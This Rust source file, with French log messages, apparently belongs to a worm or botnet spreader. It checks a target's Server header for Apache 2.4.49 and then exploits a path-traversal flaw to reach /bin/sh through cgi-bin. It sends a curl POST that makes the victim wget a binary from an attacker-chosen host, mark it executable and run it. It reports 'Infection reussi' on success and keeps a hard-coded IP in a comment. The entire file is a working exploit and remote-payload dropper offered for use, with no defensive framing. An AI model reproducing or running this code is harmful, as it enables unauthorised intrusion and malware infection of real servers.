use std::process::{Command, Output};
use std::error::{Error as StdError};

pub async fn get_apache_headers(target: String) -> Result<(), Box<dyn StdError>> {
    let url = format!("http://{}", target);
    let client = reqwest::Client::new();
    let res = client.get(&url).send().await?;

    if let Some(server) = res.headers().get("Server") {
        println!("[x] - Server: {:?}", server);
        if let Ok(server_str) = server.to_str() {
            if server_str.contains("Apache") {
                println!("[x] - Server is Apache");
                if server_str.contains("2.4.49") {
                    println!("[x] - Version is vulnerable");
                    return Ok(());
                } else {
                    return Err("[!] - Apache server version is not vulnerable".into());
                }
            } else {
                return Err("[!] - Server is not Apache".into());
            }
        } else {
            return Err("[!] - Failed to convert server header to string".into());
        }
    } else {
        return Err("[!] - Server header not found".into());
    }
}
pub(crate) async fn exploit_apache(target_ip: &str, srv: &str, port: &str) {

    match get_apache_headers(target_ip.to_string()).await {
        Ok(..) => {
            let url = format!("http://{}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh", target_ip);
            //let srv:String = format!("51.77.193.65");

            println!("[?] - Lancement de l'exploit : {}", url);

            let command_output: Output = Command::new("curl")
                .arg("-X")
                .arg("POST")
                .arg("-d")
                .arg(format!(
                    "echo; cd /tmp && wget http://{}:{}/api/foo_shi_shi_bang && chmod +x foo_shi_shi_bang && ./foo_shi_shi_bang",
                    srv,
                    port
                )) //ajouter ./...
                //.arg("echo;id")
                .arg(url)
                .output()
                .map_err(|e| format!("Failed to execute command: {}", e)).expect("Erreur requete http");



            if command_output.status.success() {
                let result_str = String::from_utf8_lossy(&command_output.stdout);
                println!("Output: {}", result_str);
                if result_str.is_empty() {
                    println!("[x] - Infection reussi - **Vérifier que le serveur WEB est allumé !!**");
                }
            }
        }
        Err(e) => {
            eprintln!("[!] - Apache : {} n'est pas vulnérable", target_ip);
        }

    }

}
